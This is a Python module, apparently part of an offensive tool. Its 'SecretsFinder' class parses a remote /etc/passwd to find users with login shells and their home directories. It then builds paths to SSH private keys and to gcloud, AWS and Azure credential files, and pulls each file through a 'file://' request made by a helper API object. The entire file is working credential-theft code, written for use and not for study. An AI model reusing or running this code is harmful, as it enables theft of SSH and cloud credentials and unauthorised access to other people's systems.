from libs.APICalls import APICalls


class SecretsFinder:
    def __init__(self, ac: APICalls, passwd: bytes):
        self.ac = ac
        self.passwd = passwd # passwd in form of b"nobody:*:-2:-2:..."

    def run(self) -> dict:
        users = self.get_users() # dict in form of {"user1": "/home/user1", ...}
        secrets_filepaths = self.get_secrets_filepaths(users)
        secrets = self.get_secrets(secrets_filepaths)

        return secrets

    def get_users(self):
        users = {}
        passwd = self.passwd.decode('UTF-8')
        for l in passwd.splitlines():
            # Eliminate nonuser lines
            if l.count(':') == 6:
                split = l.split(':')
                user = split[0]
                home = split[5]
                shell = split[6]
                # Eliminate system users    and users with no shell
                if not user.startswith("_") and not any(x in shell for x in ["/nologin", "bin/false"]):
                    users[user] = home
                    print(f'[+] User found: {user}')
        return users

    def get_secrets_filepaths(self, users: dict) -> list:
        all_creds = []
        for user, home in users.items():
            ssh_keys = [f'{home}/.ssh/' + x for x in ['id_rsa', 'id_dsa', 'id_ecdsa']]
            gcloud_keys = [f'{home}/.config/gcloud/' + x for x in ['access_tokens.db', 'credentials.db']]
            aws_keys = [f'{home}/.aws/' + x for x in ['credentials', 'config']]
            azure_keys = [f'{home}/.azure/' + x for x in ['credentials', 'accessTokens.json', 'azureProfile.json']]
            all_creds.extend(ssh_keys)
            all_creds.extend(gcloud_keys)
            all_creds.extend(aws_keys)
            all_creds.extend(azure_keys)
        return all_creds

    def get_secrets(self, secrets_filepaths: list) -> dict:
        secrets = {}
        for s in secrets_filepaths:
            proto_s = "file://." + s
            file_found = self.ac.run(proto_s) # file_found = {"remote/file/path": "file_content"}
            if file_found:
                secrets[s] = file_found[s]
        return secrets